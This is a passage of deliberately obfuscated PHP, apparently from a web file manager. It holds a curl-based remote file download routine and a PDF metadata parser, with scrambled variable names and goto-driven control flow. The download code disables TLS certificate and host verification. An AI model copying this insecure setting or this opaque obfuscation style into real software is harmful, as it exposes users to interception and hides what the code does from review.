$cÓ§ÀŠ‡¸£, $e¢ˆ¯ã„¨ä = false, $EÔ˜«äï’Æ = 0, $d¿¬Ó¢·—Æ = 0) { goto dàÏö¨Ò‹¾; dàÏö¨Ò‹¾: $d«¢‚¡»‚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BõèìƒŠœ = $cÓ§ÀŠ‡¸£ . $d«¢‚¡»‚[1483]; set_timeout(); goto C–ÂµŒ‰çƒ; C–ÂµŒ‰çƒ: $D‚Ù¸Œô›© = @fopen($BõèìƒŠœ, $d«¢‚¡»‚[974]); if (!$D‚Ù¸Œô›©) { return array($d«¢‚¡»‚[1024] => !1, $d«¢‚¡»‚[1026] => $d«¢‚¡»‚[1495]); } $dôºÏœÏ‚ì = curl_init($f¥èÌİâÉ‚); goto BÎ ±»ïº; fØË÷”Ş÷: curl_setopt($dôºÏœÏ‚ì, CURLOPT_NOPROGRESS, !1); curl_setopt($dôºÏœÏ‚ì, CURLOPT_PROGRESSFUNCTION, $d«¢‚¡»‚[1496]); curl_progress_start($dôºÏœÏ‚ì); goto c¤ª¥ŠŞÖ¹; BÎ ±»ïº: if ($e¢ˆ¯ã„¨ä) { curl_setopt($dôºÏœÏ‚ì, CURLOPT_RANGE, $EÔ˜«äï’Æ . $d«¢‚¡»‚[709]); } curl_setopt($dôºÏœÏ‚ì, CURLOPT_FILE, $D‚Ù¸Œô›©); curl_setopt($dôºÏœÏ‚ì, CURLOPT_REFERER, get_url_link($f¥èÌİâÉ‚)); goto b„·ùÔƒ¼å; dï™º¾§ª¤: curl_close($dôºÏœÏ‚ì); fclose($D‚Ù¸Œô›©); $cÈÁØÔ“öÆ = filesize(iconv_system($BõèìƒŠœ)); goto Déë¿Æ®Ñç; BÛô£¿Ä„: return array($d«¢‚¡»‚[1024] => !1, $d«¢‚¡»‚[1026] => $d«¢‚¡»‚[1498]); goto E‚ÀòÌá•Ó; Déë¿Æ®Ñç: if ($cÈÁØÔ“öÆ < $d¿¬Ó¢·—Æ && $d¿¬Ó¢·—Æ != 0) { return array($d«¢‚¡»‚[1024] => !1, $d«¢‚¡»‚[1026] => $d«¢‚¡»‚[1484]); } if ($cÈÁØÔ“öÆ > $d¿¬Ó¢·—Æ && $d¿¬Ó¢·—Æ != 0) { return array($d«¢‚¡»‚[1024] => !1, $d«¢‚¡»‚[1026] => $d«¢‚¡»‚[1492]); } if ($C“ÌÖ¬Û† && filesize($BõèìƒŠœ) != 0) { self::checkGzip($BõèìƒŠœ); if (!@rename($BõèìƒŠœ, $cÓ§ÀŠ‡¸£)) { @unlink($cÓ§ÀŠ‡¸£); $C“ÌÖ¬Û† = @rename($BõèìƒŠœ, $cÓ§ÀŠ‡¸£); if (!$C“ÌÖ¬Û†) { return array($d«¢‚¡»‚[1024] => !1, $d«¢‚¡»‚[1026] => $d«¢‚¡»‚[1497]); } } return array($d«¢‚¡»‚[1024] => !0, $d«¢‚¡»‚[1026] => $d«¢‚¡»‚[691]); } goto BÛô£¿Ä„; c¤ª¥ŠŞÖ¹: curl_setopt($dôºÏœÏ‚ì, CURLOPT_USERAGENT, $d«¢‚¡»‚[1487]); $C“ÌÖ¬Û† = curl_exec($dôºÏœÏ‚ì); curl_progress_end($dôºÏœÏ‚ì); goto dï™º¾§ª¤; b„·ùÔƒ¼å: curl_setopt($dôºÏœÏ‚ì, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($dôºÏœÏ‚ì, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($dôºÏœÏ‚ì, CURLOPT_SSL_VERIFYHOST, 0); goto fØË÷”Ş÷; E‚ÀòÌá•Ó: } static function checkGzip($EÕ†±ˆŠ‚§) { goto aÊ¾Àã†ÊŸ; aÊ¾Àã†ÊŸ: $aÈ»‚Ó«Ëì = $_SERVER[ÚŠ•´ÍéÒÑÔ][1499]; $DÈÔ‡®Ş¿ = file_sub_str($EÕ†±ˆŠ‚§, 0, 2); if ($aÈ»‚Ó«Ëì != $DÈÔ‡®Ş¿) { return; } goto Aîß¥Ášï; dÚØ£ØÅ¿: file_put_contents($EÕ†±ˆŠ‚§, $aÆ˜‰–ºİ«); goto c­Çøå²İ; Aîß¥Ášï: ob_start(); readgzfile($EÕ†±ˆŠ‚§); $aÆ˜‰–ºİ« = ob_get_clean(); goto dÚØ£ØÅ¿; c­Çøå²İ: } } class FileParsePdf { public static function parse($fÅá ÈÊ˜®) { goto DçÈÖ¡ßÅÛ; aµëí¹İğ: if ($E¹§»©‚¨[1] && $aå·ğ‰ÃÒğ[$Cøµİİ¼Î…[1508]] < $E¹§»©‚¨[1][0]) { $aå·ğ‰ÃÒğ[$Cøµİİ¼Î…[1508]] = $E¹§»©‚¨[1][0]; } $aå·ğ‰ÃÒğ = self::parseInfoItem($aå·ğ‰ÃÒğ); return $aå·ğ‰ÃÒğ; goto D‚Ó÷„È¬¥; F™Úœõ¢‚ˆ: if ($E¹§»©‚¨) { $aå·ğ‰ÃÒğ[$Cøµİİ¼Î…[1315]] = $E¹§»©‚¨[1]; } $aå·ğ‰ÃÒğ[$Cøµİİ¼Î…[1508]] = 0; $e÷„”İÅå = $Cøµİİ¼Î…[1509]; goto dôæİº‚°½; BÊâòßä¢Ş: preg_match($e÷„”İÅå, $b–ÎòÌ”[$Cøµİİ¼Î…[1502]], $E¹§»©‚¨); if (!$aå·ğ‰ÃÒğ[$Cøµİİ¼Î…[1504]] && count($E¹§»©‚¨) == 5) { $aå·ğ‰ÃÒğ[$Cøµİİ¼Î…[1504]] = $E¹§»©‚¨[3]; $aå·ğ‰ÃÒğ[$Cøµİİ¼Î…[1506]] = $E¹§»©‚¨[4]; } preg_match($Cøµİİ¼Î…[1507], $b–ÎòÌ”[$Cøµİİ¼Î…[1501]], $E¹§»©‚¨); goto F™Úœõ¢‚ˆ; Aõ¯È‹™÷: $e÷„”İÅå = $Cøµİİ¼Î…[1505]; preg_match($e÷„”İÅå, $b–ÎòÌ”[$Cøµİİ¼Î…[1501]], $E¹§»©‚¨); if (!$aå·ğ‰ÃÒğ[$Cøµİİ¼Î…[1504]] && count($E¹§»©‚¨) == 5) { $aå·ğ‰ÃÒğ[$Cøµİİ¼Î…[1504]] = $E¹§»©‚¨[3]; $aå·ğ‰ÃÒğ[$Cøµİİ¼Î…[1506]] = $E¹§»©‚¨[4]; } goto BÊâòßä¢Ş; DçÈÖ¡ßÅÛ: $Cøµİİ¼Î… =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aÄöàôÕ¾ = 32 * 1024; $b–ÎòÌ” = array($Cøµİİ¼Î…[770] => fopen($fÅá ÈÊ˜®, $Cøµİİ¼Î…[1157]), $Cøµİİ¼Î…[75] => $fÅá ÈÊ˜®, $Cøµİİ¼Î…[77] => filesize($fÅá ÈÊ˜®), $Cøµİİ¼Î…[1500] => $aÄöàôÕ¾); goto AÜÀ£œÒ®™; fë›½ÔŠğ: if ($eß“ßãˆŠß) { $DÈ«Ğ¼ÊÉ« = $eß“ßãˆŠß[$Cøµİİ¼Î…[1503]][$Cøµİİ¼Î…[1179]]; $aå·ğ‰ÃÒğ = self::getObjectValue($b–ÎòÌ”, $eß“ßãˆŠß, $DÈ«Ğ¼ÊÉ«); } $aå·ğ‰ÃÒğ = is_array($aå·ğ‰ÃÒğ) ? $aå·ğ‰ÃÒğ : array(); $aå·ğ‰ÃÒğ[$Cøµİİ¼Î…[1504]] = 0; goto Aõ¯È‹™÷; AÜÀ£œÒ®™: $b–ÎòÌ”[$Cøµİİ¼Î…[1501]] = StreamWrapperIO::read($fÅá ÈÊ˜®, 0, $aÄöàôÕ¾); $b–ÎòÌ”[$Cøµİİ¼Î…[1502]] = StreamWrapperIO::read($fÅá ÈÊ˜®, $b–ÎòÌ”[$Cøµİİ¼Î…[77]] - $aÄöàôÕ¾, $aÄöàôÕ¾); $eß“ßãˆŠß = self::decodeXref($b–ÎòÌ”); goto fë›½ÔŠğ; dôæİº‚°½: preg_match_all($e÷„”İÅå, $b–ÎòÌ”[$Cøµİİ¼Î…[1501]], $E¹§»©‚¨); if ($E¹§»©‚¨[1] && $aå·ğ‰ÃÒğ[$Cøµİİ¼Î…[1508]] < $E¹§»©‚¨[1][0]) { $aå·ğ‰ÃÒğ[$Cøµİİ¼Î…[1508]] = $E¹§»©‚¨[1][0]; } preg_match_all($e÷„”İÅå, $b–ÎòÌ”[$Cøµİİ¼Î…[1502]], $E¹§»©‚¨); goto aµëí¹İğ; D‚Ó÷„È¬¥: } private static function parseInfoItem($c«¦’ñ²×) { $BŞ…‡¾ÑêÜ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$c«¦’ñ²×) { return !1; } $eçœÍ„¥ˆ = array($BŞ…‡¾ÑêÜ[1316] => array($BŞ…‡¾ÑêÜ[1510], $BŞ…‡¾ÑêÜ[33]), $BŞ…‡¾ÑêÜ[1511] => array($BŞ…‡¾ÑêÜ[1512], $BŞ…‡¾ÑêÜ[33]), $BŞ…‡¾ÑêÜ[184] => array($BŞ…‡¾ÑêÜ[1513], $BŞ…‡¾ÑêÜ[207]), $BŞ…‡¾ÑêÜ[107] => array($BŞ…‡¾ÑêÜ[1514], $BŞ…‡¾ÑêÜ[207]), $BŞ…‡¾ÑêÜ[1508] => array($BŞ…‡¾ÑêÜ[1508], $BŞ…‡¾ÑêÜ[273]), $BŞ…‡¾ÑêÜ[1504] => array($BŞ…‡¾ÑêÜ[1504], $BŞ…‡¾ÑêÜ[273]), $BŞ…‡¾ÑêÜ[1506] => array($BŞ…‡¾ÑêÜ[1506], $BŞ…‡¾ÑêÜ[273]), $BŞ…‡¾ÑêÜ[1515] => array($BŞ…‡¾ÑêÜ[1516], $BŞ…‡¾ÑêÜ[33]), $BŞ…‡¾ÑêÜ[1517] => array($BŞ…‡¾ÑêÜ[1518], $BŞ…‡¾ÑêÜ[33]), $BŞ…‡¾ÑêÜ[1519] => array($BŞ…‡¾ÑêÜ[1315], $BŞ…‡¾ÑêÜ[33])); $a×¬£É†´ = array(); foreach ($eçœÍ„¥ˆ as $E¿æØÍ—¥‚ => $C…ÛòÑšç) { if (!isset($c«¦’ñ²×[$C…ÛòÑšç[0]])) { continue; } $EÓ¶ëÇõŞ• = $c«¦’ñ²×[$C…ÛòÑšç[0]]; if (!$EÓ¶ëÇõŞ• || is_array($EÓ¶ëÇõŞ•)) { continue; } switch ($C…ÛòÑšç[1]) { case $BŞ…‡¾ÑêÜ[273]: $EÓ¶ëÇõŞ• = intval($EÓ¶ëÇõŞ•); break; case $BŞ…‡¾ÑêÜ[207]: if (substr($EÓ¶ëÇõŞ•, 0, 2) == $BŞ…‡¾ÑêÜ[1520]) { $EÓ¶ëÇõŞ• = substr($EÓ¶ëÇõŞ•, 2, 14); } if (strtotime($EÓ¶ëÇõŞ•)) { $EÓ¶ëÇõŞ• = date($BŞ…‡¾ÑêÜ[1521], strtotime($EÓ¶ëÇõŞ•)); } break; } $a×¬£É†´[$E¿æØÍ—¥‚] = $EÓ¶ëÇõŞ•; } return $a×¬£É†´; } private static function decodeXref(&$d¾ò±áõí§) { goto C‚²ĞÜ¹¶; EŠ‹Á¾§ˆÚ: if (preg_match($dãåÑ›‹‘‡[1529], $D´È‚Š¡ˆ®, $a÷¯İìŸ‘“) > 0) { $dµö¦»²†Ó[$dãåÑ›‹‘‡[1503]][$dãåÑ›‹‘‡[77]] = intval($a÷¯İìŸ‘“[1]); } if (preg_match($dãåÑ›‹‘‡[1530], $D´È‚Š¡ˆ®, $a÷¯İìŸ‘“) > 0) { $dµö¦»²†Ó[$dãåÑ›‹‘‡[1503]][$dãåÑ›‹‘‡[1531]] = intval($a÷¯İìŸ‘“[1]) . $dãåÑ›‹‘‡[70] . intval($a÷¯İìŸ‘“[2]); } if (preg_match($dãåÑ›‹‘‡[1532], $D´È‚Š¡ˆ®, $a÷¯İìŸ‘“) > 0) { $dµö¦»²†Ó[$dãåÑ›‹‘‡[1503]][$dãåÑ›‹‘‡[1533]] = intval($a÷¯İìŸ‘“[1]) . $dãåÑ›‹‘‡[70] . intval($a÷¯İìŸ‘“[2]); } goto Bğ×Òê ù; C‚²ĞÜ¹¶: $dãåÑ›‹‘‡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $c‰’å®Ù±á = $d¾ò±áõí§[$dãåÑ›‹‘‡[1502]]; $dµö¦»²†Ó = array($dãåÑ›‹‘‡[1503] => array(), $dãåÑ›‹‘‡[1522] => array()); goto c†±÷Šç“Ú; B¾µ¡˜«Ú: if ($d¾ò±áõí§[$dãåÑ›‹‘‡[77]] - $C™²³È­Ù > $d¾ò±áõí§[$dãåÑ›‹‘‡[1500]]) { $EÚ¶Ó”ß•™ = 4 * $d¾ò±áõí§[$dãåÑ›‹‘‡[1500]]; $d¾ò±áõí§[$dãåÑ›‹‘‡[1500]] = $EÚ¶Ó”ß•™; $d¾ò±áõí§[$dãåÑ›‹‘‡[1501]] = StreamWrapperIO::read($d¾ò±áõí§[$dãåÑ›‹‘‡[75]], 0, $EÚ¶Ó”ß•™); $d¾ò±áõí§[$dãåÑ›‹‘‡[1502]] = StreamWrapperIO::read($d¾ò±áõí§[$dãåÑ›‹‘‡[75]], $d¾ò±áõí§[$dãåÑ›‹‘‡[77]] - $EÚ¶Ó”ß•™, $EÚ¶Ó”ß•™); $c‰’å®Ù±á = $d¾ò±áõí§[$dãåÑ›‹‘‡[1502]]; } $cŒÔ·¤ö•Å = 0; preg_match_all($dãåÑ›‹‘‡[1524], $c‰’å®Ù±á, $a÷¯İìŸ‘“); goto F —êŸÑÒ; F —êŸÑÒ: foreach ($a÷¯İìŸ‘“[3] as $AÙ•ç¾Ê => $DãóÂ½•êƒ) { if ($a÷¯İìŸ‘“[3][$AÙ•ç¾Ê] == $dãåÑ›‹‘‡[1525]) { $B¡¡¬øóù  = $cŒÔ·¤ö•Å . $dãåÑ›‹‘‡[70] . intval($a÷¯İìŸ‘“[2][$AÙ•ç¾Ê]); $dµö¦»²†Ó[$dãåÑ›‹‘‡[1522]][$B¡¡¬øóù ] = intval($a÷¯İìŸ‘“[1][$AÙ•ç¾Ê]); ++$cŒÔ·¤ö•Å; } else { if ($a÷¯İìŸ‘“[3][$AÙ•ç¾Ê] == $dãåÑ›‹‘‡[1526]) { ++$cŒÔ·¤ö•Å; } else { } } } if (preg_match_all($dãåÑ›‹‘‡[1527], $c‰’å®Ù±á, $a÷¯İìŸ‘“)) { $FÉ§–Š“Ê³ = $d¾ò±áõí§[$dãåÑ›‹‘‡[77]] - $d¾ò±áõí§[$dãåÑ›‹‘‡[1500]]; foreach ($a÷¯İìŸ‘“[0] as $AÙ•ç¾Ê => $B¥Åõ‹Ô‰) { $EÒ±™Ù™ªš = $a÷¯İìŸ‘“[1][$AÙ•ç¾Ê] . $dãåÑ›‹‘‡[70] . $a÷¯İìŸ‘“[2][$AÙ•ç¾Ê]; $dµö¦»²†Ó[$dãåÑ›‹‘‡[1522]][$EÒ±™Ù™ªš] = strpos($c‰’å®Ù±á, $B¥Åõ‹Ô‰) + $FÉ§–Š“Ê³ + 1; } } if (preg_match_all($dãåÑ›‹‘‡[1528], $c‰’å®Ù±á, $a÷¯İìŸ‘“)) { $D´È‚Š¡ˆ® = count($a÷¯İìŸ‘“[1]) == 1 ? $a÷¯İìŸ‘“[1][0] : $a÷¯İìŸ‘“[1][1]; } else { $D´È‚Š¡ˆ® = substr($c‰’å®Ù±á, -1024 * 5); } goto EŠ‹Á¾§ˆÚ; Bğ×Òê ù: if (preg_match($dãåÑ›‹‘‡[1534], $D´È‚Š¡ˆ®, $a÷¯İìŸ‘“) > 0) { $dµö¦»²†Ó[$dãåÑ›‹‘‡[1503]][$dãåÑ›‹‘‡[1179]] = intval($a÷¯İìŸ‘“[1]) . $dãåÑ›‹‘‡[70] . intval($a÷¯İìŸ‘“[2]); } if (preg_match($dãåÑ›‹‘‡[1535], $D´È‚Š¡ˆ®, $a÷¯İìŸ‘“) > 0) { $dµö¦»²†Ó[$dãåÑ›‹‘‡[1503]][$dãåÑ›‹‘‡[364]] = array(); $dµö¦»²†Ó[$dãåÑ›‹‘‡[1503]][$dãåÑ›‹‘‡[364]][0] = $a÷¯İìŸ‘“[1]; $dµö¦»²†Ó[$dãåÑ›‹‘‡[1503]][$dãåÑ›‹‘‡[364]][1] = $a÷¯İìŸ‘“[2]; } if (!$dµö¦»²†Ó[$dãåÑ›‹‘‡[1503]][$dãåÑ›‹‘‡[1179]]) { return !1; } goto fïÈ‰¶ Ä—; fïÈ‰¶ Ä—: if (preg_match($dãåÑ›‹‘‡[1536], $D´È‚Š¡ˆ®, $a÷¯İìŸ‘“) > 0) { } return $dµö¦»²†Ó; goto D×£Ö¬‡íó; c†±÷Šç“Ú: $E§âÄëÎ‰“ = $dãåÑ›‹‘‡[1523]; if (!preg_match_all($E§âÄëÎ‰“, $c‰’å®Ù±á, $a÷¯İìŸ‘“, PREG_SET_ORDER, 0)) { return !1; } $C™²³È­Ù = intval($a÷¯İìŸ‘“[0][1]); goto B¾µ¡˜«Ú; D×£Ö¬‡íó: } private static function getObjectValue($c™âäš­íš, $F¾·Ôî…ƒ‚, $fí‚ƒÌ) { goto FĞ»´¬•Ù; B» ˆŞÆ©: return $EÊ‡öˆ¸ø; goto CÎÓæ¢Øˆ”; FĞ»´¬•Ù: $aÎÔ”¦Şİ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cæ†‹«Şêê = self::getObject($c™âäš­íš, $F¾·Ôî…ƒ‚[$aÎÔ”¦Şİ[1522]][$fí‚ƒÌ]); if (is_string($cæ†‹«Şêê[1])) { return $cæ†‹«Şêê[1]; } goto Fäæ‚Óõ¡ê; Fäæ‚Óõ¡ê: if (!is_array($cæ†‹«Şêê[1])) { return array(); } $EÊ‡öˆ¸ø = array(); for ($CáõÁöÚğå = 0; $CáõÁöÚğå < count($cæ†‹«Şêê[1]); $CáõÁöÚğå += 2) { $A¥¶²„«ô = $cæ†‹«Şêê[1][$CáõÁöÚğå]; $C†„Â›Ó¼­ = $cæ†‹«Şêê[1][$CáõÁöÚğå + 1]; if (count($A¥¶²„«ô) == 3 && $A¥¶²„«ô[0] == $aÎÔ”¦Şİ[8]) { $c‡ñÓô‰ëÇ = !1; if ($C†„Â›Ó¼­[0] == $aÎÔ”¦Şİ[1537]) { $C†„Â›Ó¼­ = self::getObject($c™âäš­íš, $F¾·Ôî…ƒ‚[$aÎÔ”¦Şİ[1522]][$C†„Â›Ó¼­[1]]); } $c‡ñÓô‰ëÇ = $C†„Â›Ó¼­[1]; if ($c‡ñÓô‰ëÇ === !1) { continue; } if (is_string($c‡ñÓô‰ëÇ)) { $c‡ñÓô‰ëÇ = self::decodeStr($c‡ñÓô‰ëÇ); } $EÊ‡öˆ¸ø[$A¥¶²„«ô[1]] = $c‡ñÓô‰ëÇ; } } goto B» ˆŞÆ©; CÎÓæ¢Øˆ”: } private static function getObject($EŠ´»ÙÄ§, $eÂö¯®†) { $bÙ¶ê©š = self::getObjectItem($EŠ´»ÙÄ§, $eÂö¯®†); $bÙ¶ê©š = self::getObjectItem($EŠ´»ÙÄ§, $bÙ¶ê©š[2]); return $bÙ¶ê©š; } private static function getObjectItem($fßÎ¸ê£•, $Fƒºò›Ö–ˆ) { goto aï„ßÃã‘Á; aï„ßÃã‘Á: $C‰Üóùİá° =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E¯¶Ê‡áŞ‚ = $fßÎ¸ê£•[$C‰Üóùİá°[1500]]; $EèË´›¾’Ì = $fßÎ¸ê£•[$C‰Üóùİá°[77]] - $E¯¶Ê‡áŞ‚; goto b”õì¸Õ‰Í; b”õì¸Õ‰Í: $F‡•Ê¯Ó• = $Fƒºò›Ö–ˆ >= $EèË´›¾’Ì ? $Fƒºò›Ö–ˆ - $EèË´›¾’Ì : $Fƒºò›Ö–ˆ; $Dœ Ô„µ§§ = $Fƒºò›Ö–ˆ >= $EèË´›¾’Ì ? $fßÎ¸ê£•[$C‰Üóùİá°[1502]] : $fßÎ¸ê£•[$C‰Üóùİá°[1501]]; if ($Fƒºò›Ö–ˆ > $E¯¶Ê‡áŞ‚ && $Fƒºò›Ö–ˆ <= $EèË´›¾’Ì) { $F‡•Ê¯Ó• = 0; $Dœ Ô„µ§§ = StreamWrapperIO::read($fßÎ¸ê£•[$C‰Üóùİá°[75]], $Fƒºò›Ö–ˆ, $E¯¶Ê‡áŞ‚); } goto F‡¶ÒÉ‘•ñ; F‡¶ÒÉ‘•ñ: $aÎÂ³ƒ‘Ğ« = self::getRawObject($Dœ Ô„µ§§, $F‡•Ê¯Ó•); if ($Fƒºò›Ö–ˆ >= $EèË´›¾’Ì) { $aÎÂ³ƒ‘Ğ«[2] = $aÎÂ³ƒ‘Ğ«[2] + $EèË´›¾’Ì; } else { if ($Fƒºò›Ö–ˆ > $E¯¶Ê‡áŞ‚ && $Fƒºò›Ö–ˆ <= $EèË´›¾’Ì) { $aÎÂ³ƒ‘Ğ«[2] = $aÎÂ³ƒ‘Ğ«[2] + $Fƒºò›Ö–ˆ; } } return $aÎÂ³ƒ‘Ğ«; goto CæõëØÔêá; CæõëØÔêá: } private static function decodeStr($Cğ‘Õ‹ÅæÅ) { goto BÔÏÉˆ‰´; d©ŞÃ‡İ’ó: $Cğ‘Õ‹ÅæÅ = $f¹¹Œœ®„ë[33]; foreach ($c‰È¹æ½— as $a×–ƒ°®˜®) { if (preg_match($f¹¹Œœ®„ë[1549], $a×–ƒ°®˜®)) { $Cğ‘Õ‹ÅæÅ .= \chr(hexdec(trim($a×–ƒ°®˜®, $f¹¹Œœ®„ë[1550]))); } else { $Cğ‘Õ‹ÅæÅ .= $a×–ƒ°®˜®; } } $c‰È¹æ½— = preg_split($f¹¹Œœ®„ë[1551], $Cğ‘Õ‹ÅæÅ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto d³ÔœË¯Ÿ·; BÔÏÉˆ‰´: $f¹¹Œœ®„ë =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Cğ‘Õ‹ÅæÅ = str_replace(array($f¹¹Œœ®„ë[1538], $f¹¹Œœ®„ë[1539], $f¹¹Œœ®„ë[1540], $f¹¹Œœ®„ë[1541], $f¹¹Œœ®„ë[1542], $f¹¹Œœ®„ë[1543], $f¹¹Œœ®„ë[1544], $f¹¹Œœ®„ë[1545]), array($f¹¹Œœ®„ë[95], $f¹¹Œœ®„ë[50], $f¹¹Œœ®„ë[8], $f¹¹Œœ®„ë[245], $f¹¹Œœ®„ë[811], $f¹¹Œœ®„ë[214], $f¹¹Œœ®„ë[984], $f¹¹Œœ®„ë[327]), $Cğ‘Õ‹ÅæÅ); $c‰È¹æ½— = preg_split($f¹¹Œœ®„ë[1546], $Cğ‘Õ‹ÅæÅ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto fë”¨ù˜; fë”¨ù˜: $Cğ‘Õ‹ÅæÅ = $f¹¹Œœ®„ë[33]; foreach ($c‰È¹æ½— as $a×–ƒ°®˜®) { if (preg_match($f¹¹Œœ®„ë[1547], $a×–ƒ°®˜®)) { $Cğ‘Õ‹ÅæÅ .= \chr(octdec(trim($a×–ƒ°®˜®, $f¹¹Œœ®„ë[95]))); } else { $Cğ‘Õ‹ÅæÅ .= $a×–ƒ°®˜®; } } $c‰È¹æ½— = preg_split($f¹¹Œœ®„ë[1548], $Cğ‘Õ‹ÅæÅ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto d©ŞÃ‡İ’ó; c·Ó¤ÕÌâ: return $Cğ‘Õ‹ÅæÅ; goto EğÖÑ³¸Óé; d³ÔœË¯Ÿ·: $Cğ‘Õ‹ÅæÅ = $f¹¹Œœ®„ë[33]; foreach ($c‰È¹æ½— as $a×–ƒ°®˜®) { if (preg_match($f¹¹Œœ®„ë[1552], $a×–ƒ°®˜®) && !1 === stripos($a×–ƒ°®˜®, $f¹¹Œœ®„ë[1553])) { $a×–ƒ°®˜® = preg_replace($f¹¹Œœ®„ë[1554], $f¹¹Œœ®„ë[33], $a×–ƒ°®˜®); $a×–ƒ°®˜® = trim($a×–ƒ°®˜®, $f¹¹Œœ®„ë[920]); $a×–ƒ°®˜® = pack($f¹¹Œœ®„ë[1555], $a×–ƒ°®˜®); $Cğ‘Õ‹ÅæÅ .= $a×–ƒ°®˜®; } else { $Cğ‘Õ‹ÅæÅ .= $a×–ƒ°®˜®; } } if (preg_match($f¹¹Œœ®„ë[1556], $Cğ‘Õ‹ÅæÅ)) { $AŞŒÛˆÀ•œ = substr($Cğ‘Õ‹ÅæÅ, 2); $Cğ‘Õ‹ÅæÅ = $f¹¹Œœ®„ë[33]; $f™Š…ò‘µ = strlen($AŞŒÛˆÀ•œ); for ($a‰÷×ÇÚ = 0; $a‰÷×ÇÚ < $f™Š…ò‘µ; $a‰÷×ÇÚ += 2) { $A­Š™«ÕÇÔ = hexdec(bin2hex(substr($AŞŒÛˆÀ•œ, $a‰÷×ÇÚ, 2))); $Cğ‘Õ‹ÅæÅ .= mb_convert_encoding($f¹¹Œœ®„ë[1557] . intval($A­Š™«ÕÇÔ) . $f¹¹Œœ®„ë[67], $f¹¹Œœ®„ë[1558], $f¹¹Œœ®„ë[1559]); } } goto c·Ó¤ÕÌâ; EğÖÑ³¸Óé: } private static function getRawObject($EÖÖ»É¾ ¶, $eâ¥ğôô« = 0) { goto CÍÌÅĞÏ«Ÿ; EäÖõ¤©÷: $eâ¥ğôô« += strspn($EÖÖ»É¾ ¶, $Cí¤º½êÁ[1560], $eâ¥ğôô«); $B…ŸÅğéî = $EÖÖ»É¾ ¶[$eâ¥ğôô«]; switch ($B…ŸÅğéî) { case $Cí¤º½êÁ[1561]: $eºÂ£ÊÁµ‰ = strcspn($EÖÖ»É¾ ¶, $Cí¤º½êÁ[1562], $eâ¥ğôô«); if ($eºÂ£ÊÁµ‰ > 0) { $eâ¥ğôô« += $eºÂ£ÊÁµ‰; return self::getRawObject($EÖÖ»É¾ ¶, $eâ¥ğôô«); } break; case $Cí¤º½êÁ[8]: $f‰“ôå¨í¼ = $B…ŸÅğéî; ++$eâ¥ğôô«; $Dˆß¶ó‡ÂÃ = preg_match($Cí¤º½êÁ[1563], substr($EÖÖ»É¾ ¶, $eâ¥ğôô«, 256), $c˜Õ¯´ĞøŸ); if (1 == $Dˆß¶ó‡ÂÃ) { $aÍöâŒÄœê = $c˜Õ¯´ĞøŸ[1]; $eâ¥ğôô« += strlen($aÍöâŒÄœê); } break; case $Cí¤º½êÁ[245]: case $Cí¤º½êÁ[811]: $f‰“ôå¨í¼ = $B…ŸÅğéî; ++$eâ¥ğôô«; $A©Éİ©æ¶¡ = $eâ¥ğôô«; if ($Cí¤º½êÁ[245] == $B…ŸÅğéî) { $A‡ÀÄÌÄšñ = 1; while ($A‡ÀÄÌÄšñ > 0) { if (!isset($EÖÖ»É¾ ¶[$A©Éİ©æ¶¡])) { break; } $E‰¢÷Â»¿Ó = $EÖÖ»É¾ ¶[$A©Éİ©æ¶¡]; switch ($E‰¢÷Â»¿Ó) { case $Cí¤º½êÁ[95]: ++$A©Éİ©æ¶¡; break; case $Cí¤º½êÁ[245]: ++$A‡ÀÄÌÄšñ; break; case $Cí¤º½êÁ[811]: --$A‡ÀÄÌÄšñ; break; } ++$A©Éİ©æ¶¡; } $aÍöâŒÄœê = substr($EÖÖ»É¾ ¶, $eâ¥ğôô«, $A©Éİ©æ¶¡ - $eâ¥ğôô« - 1); $eâ¥ğôô« = $A©Éİ©æ¶¡; } break; case $Cí¤º½êÁ[154]: case $Cí¤º½êÁ[472]: $f‰“ôå¨í¼ = $B…ŸÅğéî; ++$eâ¥ğôô«; if ($Cí¤º½êÁ[154] == $B…ŸÅğéî) { $aÍöâŒÄœê = array(); do { $f“Š”­Ù…Œ = $eâ¥ğôô«; $Eè£Çó± = self::getRawObject($EÖÖ»É¾ ¶, $eâ¥ğôô«); $eâ¥ğôô« = $Eè£Çó±[2]; $aÍöâŒÄœê[] = $Eè£Çó±; } while ($Cí¤º½êÁ[472] != $Eè£Çó±[0] && $eâ¥ğôô« != $f“Š”­Ù…Œ); array_pop($aÍöâŒÄœê); } break; case $Cí¤º½êÁ[919]: case $Cí¤º½êÁ[922]: if (isset($EÖÖ»É¾ ¶[$eâ¥ğôô« + 1]) && $EÖÖ»É¾ ¶[$eâ¥ğôô« + 1] == $B…ŸÅğéî) { $f‰“ôå¨í¼ = $B…ŸÅğéî . $B…ŸÅğéî; $eâ¥ğôô« += 2; if ($Cí¤º½êÁ[919] == $B…ŸÅğéî) { $aÍöâŒÄœê = array(); do { $f“Š”­Ù…Œ = $eâ¥ğôô«; $Eè£Çó± = self::getRawObject($EÖÖ»É¾ ¶, $eâ¥ğôô«); $eâ¥ğôô« = $Eè£Çó±[2]; $aÍöâŒÄœê[] = $Eè£Çó±; } while ($Cí¤º½êÁ[1564] != $Eè£Çó±[0] && $eâ¥ğôô« != $f“Š”­Ù…Œ); array_pop($aÍöâŒÄœê); } } else { $f‰“ôå¨í¼ = $B…ŸÅğéî; ++$eâ¥ğôô«; $Dˆß¶ó‡ÂÃ = preg_match($Cí¤º½êÁ[1565], substr($EÖÖ»É¾ ¶, $eâ¥ğôô«), $c˜Õ¯´ĞøŸ); if ($Cí¤º½êÁ[919] == $B…ŸÅğéî && 1 == $Dˆß¶ó‡ÂÃ) { $aÍöâŒÄœê = strtr($c˜Õ¯´ĞøŸ[1], $Cí¤º½êÁ[1566], $Cí¤º½êÁ[33]); $eâ¥ğôô« += \strlen($c˜Õ¯´ĞøŸ[0]); } elseif (!1 !== ($e­İ»ì´‚Â = 